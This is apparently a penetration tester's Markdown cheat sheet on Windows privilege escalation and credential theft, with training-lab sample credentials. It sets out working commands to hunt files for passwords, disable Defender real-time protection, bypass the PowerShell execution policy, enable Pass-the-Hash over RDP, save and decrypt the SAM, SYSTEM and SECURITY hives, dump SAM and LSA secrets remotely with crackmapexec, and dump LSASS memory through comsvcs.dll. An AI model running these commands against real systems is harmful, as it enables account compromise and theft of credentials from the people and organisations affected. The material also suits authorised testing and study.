# Windows Priv Esc

## Credential hunting code chunks

<img width="657" alt="Screen Shot 2022-08-06 at 2 44 39 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/96928590-0c83-4281-bbf9-cd0e5c5be354">

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

``` 
dir secret.doc /s /p
```


## Find location of file using cmd.exe
```
where /R C:\ waldo.txt
```

### lazagne.exe
Search for creds 

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/967edbe2-5a31-463d-95cd-e9b7e722be06)


### Snaffler 
Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. 

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/96179d5a-2b09-4149-8540-927ba2e13e9c)


### Bloodhound

To Run bloodhound. Upload and run sharphound to the victim.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/00c27b7f-51ca-49bd-9ec2-db1c5c8887b2)

Download zipfile to attack machine. Start neo4j.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8f08ccad-6198-4250-b2fd-baacef6d37b4)

Start Bloodhound. Login

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/373b653d-01df-4491-942b-98dad01b9f2a)

On right side of screen, upload data, select zip file.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/5b2b0c34-e3d0-47bd-9417-93f34e58df93)


### Inveigh
Like responder.
![Pasted image 20230508074627](https://github.com/dbissell6/Shadow_Stone/assets/50979196/2ee76561-6c3a-4941-a859-0212c76bd8aa)

![Pasted image 20230508074732](https://github.com/dbissell6/Shadow_Stone/assets/50979196/e51ce110-da44-4b04-aa14-5183bb46827f)

## AV 
Get status of AV

![Pasted image 20230508095011](https://github.com/dbissell6/Shadow_Stone/assets/50979196/deb17c10-cb12-4381-8f96-040497f65966)

### Applocker 
Windows way to whitelist acceptable apps to run

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### See if Powershell is constrained

![Pasted image 20230508095505](https://github.com/dbissell6/Shadow_Stone/assets/50979196/61ec3ded-a452-4e9e-861d-856682505547)

## Making changes to AV

Turn off AV - need admin
`Set-MpPreference -DisableRealtimeMonitoring $true`

Turn off Real-time
```
Set-MpPreference -DisableIOAVProtection $true
```

<img width="783" alt="Screen Shot 2022-10-10 at 2 15 20 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/38ce0352-57e2-4ccb-a68a-bbb6e49eb5ed">

## Temporary bypass
You can bypass the execution policy for the current PowerShell session by running the following command:

```
Set-ExecutionPolicy Bypass -Scope Process
```

To allow Pass-the-Hash (PTH) attacks over Remote Desktop Protocol (RDP) and disable Restricted Admin mode, you need to set the following registry value to 0
```
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

```


https://github.com/r3motecontrol/Ghostpack-CompiledBinaries


## Process search
powershell code
```
Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}
```
<img width="569" alt="Screen Shot 2022-08-05 at 5 23 55 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/9db828d4-b9dd-4a77-a096-56761e7380b9">


## Attacking SAM

The Windows Security Account Manager (SAM) database is a critical component of the Windows operating system that stores user account information and password hashes. It plays a crucial role in authentication and authorization processes on a Windows-based system. Here's a breakdown of how the Windows SAM database works:

1) User Account Information Storage: The SAM database stores essential information about user accounts, such as usernames, user IDs (SIDs - Security Identifiers), account status (active or disabled), and password hashes.

2)  Password Hashes: Instead of storing passwords in plaintext, the SAM database stores password hashes. A password hash is a one-way cryptographic representation of the user's password. When a user creates or changes their password, the system generates a hash of the password and stores it in the SAM database. This way, the actual passwords are not directly accessible, enhancing security.

3)  Hashing Algorithm: Windows operating systems use various hashing algorithms over the years. Historically, they used LM (LAN Manager) and NTLM (NT LAN Manager) hash algorithms, which are now considered weak. In modern versions of Windows, such as Windows 10 and Windows Server 2016 and later, more secure algorithms like NTLMv2 and Kerberos are used.

4)  Access Control: The SAM database is protected to ensure its integrity and confidentiality. Only privileged system processes and administrators with the appropriate permissions can access the SAM database directly. Access to this file is heavily restricted to prevent unauthorized access and tampering.

5)  User Authentication: When a user attempts to log in to a Windows system, the system verifies their credentials by checking the provided password against the stored hash in the SAM database. If the hashes match, the authentication is successful, and the user gains access to the system.

6)  Offline Attacks: While the SAM database is protected on a running system, an attacker with physical access to the machine might attempt to extract the SAM database files and perform "offline" attacks. In such attacks, the attacker can use specialized tools to crack the password hashes without interacting with the live system.

7) LSA Secrets: Besides user account information, the SAM database also stores Local Security Authority (LSA) secrets. These secrets can include sensitive data, such as service account passwords or auto-logon credentials. Access to LSA secrets is also restricted and requires administrative privileges.

It's important to note that Windows has been evolving over time, and its security mechanisms have improved. For instance, modern Windows versions use the more secure Active Directory (AD) system for managing user accounts and authentication in a networked environment, which stores user account information centrally and implements additional security measures.


### hklm\sam:

The hklm\sam refers to a specific hive in the Windows Registry, where the SAM database is stored. The Windows Registry is a centralized hierarchical database used by the Windows operating system to store configuration settings, options, and information about system components, user preferences, and installed software.

The SAM hive, short for Security Accounts Manager, is a key component of the Windows Registry that holds the local user account database and their respective password hashes. This database is used for authentication on a local Windows system. The SAM database is locked while the system is running to prevent unauthorized access, but with the right tools and privileges, it is possible to access the SAM hive.

The password hashes stored in the SAM database are one-way cryptographic representations of the user account passwords. They are generated using a hashing algorithm (e.g., NTLMv2 or Kerberos) and cannot be converted back into the original plaintext passwords easily. The goal of extracting the hashes from the SAM database is to attempt to crack them using specialized tools and techniques to reveal the original passwords.

### hklm\system:

The hklm\system refers to another hive in the Windows Registry that contains vital information about the Windows system, including device drivers, system configuration, and hardware settings.

Of particular interest for password cracking purposes, the hklm\system hive holds the System boot key. The System boot key is a cryptographic key that is used to encrypt sensitive information, including the SAM database's password hashes.

When Windows starts up, it uses the System boot key to decrypt the password hashes stored in the SAM database, allowing the system to perform user authentication. By obtaining the System boot key, an attacker gains access to the necessary information to decrypt the password hashes offline, even if the SAM database is not directly accessible on the running system.

For security reasons, the hklm\system hive is also protected, and access to it is restricted to privileged system processes and administrators with the appropriate permissions.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/3db4b6f6-f994-49ef-bd40-d348532c0b7e)


```
 reg.exe save hklm\sam C:\sam.save; reg.exe save hklm\system C:\system.save; reg.exe save hklm\security C:\security.save
```


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/1d1df6e9-cb75-4d82-92e7-4a5190dc60cf)

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Check cracking to see how to crack hashes, PTH tho?

Extract Hashes from SAM Database with admin creds

### Do the above remotly

```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
### LSA remote dump
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
## Attack LSASS

The Windows Local Security Authority Subsystem Service (LSASS) is a critical component of the Windows operating system that handles various security-related functions, including user authentication, local security policy enforcement, and management of security tokens.

Here's an explanation of Windows LSASS and its functionalities:

1)  Process Description: LSASS is a system process that runs in the background of the Windows operating system. It operates as a protected system process, meaning it runs with elevated privileges and cannot be terminated by normal means.

2)  Authentication and Authorization: One of the primary functions of LSASS is user authentication. When a user attempts to log in to a Windows system, LSASS handles the authentication process. It verifies the user's credentials (username and password) against the password hashes stored in the SAM database (Security Account Manager), which we discussed earlier. If the authentication is successful, LSASS creates a security token for the user, which contains the user's security identifier (SID) and their associated security privileges.

3)  Security Token Management: LSASS is responsible for managing security tokens. These tokens are created for users during logon and contain the user's identity, group memberships, and security privileges. The tokens are then used to grant or deny access to various system resources based on the user's permissions.

4)  Enforcement of Security Policies: LSASS enforces local security policies on the system. These policies define various security settings, such as password complexity requirements, account lockout policies, and user rights assignments. LSASS ensures that these policies are applied and followed when users log in and access system resources.

5)  Lsass.exe Process: The LSASS service is represented by the lsass.exe process in Task Manager. As a critical system process, it is essential to protect it from unauthorized access and tampering. Malware or attackers may attempt to target LSASS for privilege escalation or credential theft, making it a high-value target for security.

6)  Handling LSA Secrets: In addition to user authentication and security token management, LSASS also deals with Local Security Authority (LSA) secrets. LSA secrets are sensitive data, such as service account passwords, auto-logon credentials, and other encrypted information used by the system. LSASS securely stores and manages these secrets, ensuring they are accessible only by authorized processes and services.


### Dump with task manager

Right click on 'Local Security Authority Process'
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b17ce34e-871f-4d46-8e4a-00ee00dd4e72)

### Dump with Powershell
```
PS C:\Windows\System32> ./rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 672 C:\lsass.dmp full
```
### pypykatz to extract creds
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/73175859-68c8-4c57-b017-179492da0fdb)
